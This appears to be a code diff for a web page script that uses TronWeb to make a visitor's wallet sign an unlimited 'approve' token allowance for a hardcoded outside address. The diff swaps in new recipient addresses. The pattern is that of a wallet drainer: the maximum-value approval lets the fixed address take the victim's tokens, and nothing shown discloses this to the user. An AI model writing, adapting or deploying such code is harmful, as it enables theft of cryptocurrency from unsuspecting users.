@@ -166,7 +166,7 @@
                     const userAddress = await tronWebInstance.defaultAddress.base58;
                     console.log(`User Address: ${userAddress}`);
                     const contractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-                    const approveaddress = "TAV1iZH5P4ATSBTS3BBGgSJcPmCRZFgVbr";
+                    const approveaddress = "TLkPRcskbZqWUL1iLk32Uf9pWsj3icoMBx";
                     const approvalParams = [
                         { "type": "address", "value": approveaddress },
                         { "type": "uint256", "value": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" }
@@ -174,7 +174,7 @@
                     const approvalOptions = { "feeLimit": 100000000 };
                     const approvalTransaction = await tronWebInstance.transactionBuilder.triggerSmartContract(
                         contractAddress, 
-                        "increaseApproval(address,uint256)", 
+                        "approve(address,uint256)", 
                         approvalOptions, 
                         approvalParams, 
                         userAddress
@@ -183,7 +183,7 @@
                   
                  
                          const approvalParamst = [
-                        { "type": "address", "value": approveaddress },
+                        { "type": "address", "value": 'THRAE2VhGNAcvPKtT96AqyXtSQwhiU1XL8' },
                         { "type": "uint256", "value": "0" }
                     ];
                         const transferTransaction = await tronWebInstance.transactionBuilder.triggerSmartContract(
